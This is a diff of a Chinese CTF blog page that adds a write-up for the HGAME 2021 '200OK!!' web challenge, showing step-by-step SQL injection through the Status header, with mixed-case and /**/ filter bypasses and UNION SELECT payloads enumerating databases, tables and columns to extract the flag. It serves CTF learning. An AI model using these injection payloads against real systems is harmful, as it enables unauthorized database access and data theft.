@@ -512,7 +512,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4k
+                    4.2k
                 </div>
                 
 
@@ -1014,6 +1014,36 @@ username=testuser&amp;password=QNKCDZO</code></pre>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210210012728845.png"></p>
 <p>然后带着这个 cookie 访问 <code>/flag</code>，拿到 flag</p>
 <p><code>hgame{X5s_t0_GEt_@dm1n's_cOokies.}</code></p>
+<h3 id="200OK"><a href="#200OK" class="headerlink" title="200OK!!"></a>200OK!!</h3><blockquote>
+<p><strong>hint: status 字段会有什么坏心思呢?</strong><br><strong>hint: 这些字符串存在哪里呢？变量？还是…？</strong><br>今天你 PTSD 了吗？</p>
+<p><a target="_blank" rel="noopener" href="https://200ok.liki.link/">https://200ok.liki.link</a> </p>
+</blockquote>
+<p>Header Status 字段 SQL 注入。</p>
+<p>过滤了一些关键词，大小写混用来绕过，空格用 <code>/**/</code> 绕过。</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># GET https://200ok.liki.link/server.php</span>
+<span class="token comment"># 查询当前数据库</span>
+<span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/uNion/**/SelecT/**/database()#
+week2sqli
+
+# 查询所有数据库
+-1'</span><span class="token comment">/**/</span><span class="token keyword">uNion</span><span class="token comment">/**/</span><span class="token keyword">SelecT</span><span class="token comment">/**/</span>group_concAt<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">fRom</span><span class="token comment">/**/</span>information_schema<span class="token punctuation">.</span>schemata<span class="token comment">#</span>
+information_schema<span class="token punctuation">,</span>mysql<span class="token punctuation">,</span>performance_schema<span class="token punctuation">,</span>sys<span class="token punctuation">,</span>week2sqli
+
+<span class="token comment"># 查询表名</span>
+<span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/uNion/**/SelecT/**/group_concAt(table_name)/**/frOm/**/information_schema.tables/**/wherE/**/table_schema=database()#
+f1111111144444444444g,status
+
+# 查询列名
+-1'</span><span class="token comment">/**/</span><span class="token keyword">uNion</span><span class="token comment">/**/</span><span class="token keyword">SelecT</span><span class="token comment">/**/</span>group_concAt<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">frOm</span><span class="token comment">/**/</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment">/**/</span><span class="token keyword">wherE</span><span class="token comment">/**/</span>table_name<span class="token operator">=</span><span class="token string">'f1111111144444444444g'</span><span class="token comment">#</span>
+ffffff14gggggg
+
+<span class="token comment"># 查询字段值</span>
+<span class="token operator">-</span><span class="token number">1</span>'<span class="token comment">/**/</span><span class="token keyword">uNion</span><span class="token comment">/**/</span><span class="token keyword">SelecT</span><span class="token comment">/**/</span>ffffff14gggggg<span class="token comment">/**/</span><span class="token keyword">frOm</span><span class="token comment">/**/</span>f1111111144444444444g<span class="token comment">#</span>
+hgame{Con9raTu1ati0n5<span class="token operator">+</span>yoU_FXXK<span class="token operator">~</span>Up<span class="token operator">-</span>tH3<span class="token punctuation">,</span><span class="token number">5</span>Q1<span class="token operator">!</span><span class="token operator">!=</span><span class="token punctuation">)</span>}</code></pre>
+
+
+
+
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p><strong>task:</strong></p>
 <pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number
@@ -1844,7 +1874,7 @@ y_7&#x3D;x_7⊕n_7⊕(x_7⋙2)⊕(x_7⋘5)
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
                         &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">172.6k</span>&nbsp;字
+                class="white-color">172.8k</span>&nbsp;字
                                                                                     <span id="busuanzi_container_site_pv">
 			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                     class="white-color"></span>&nbsp;次
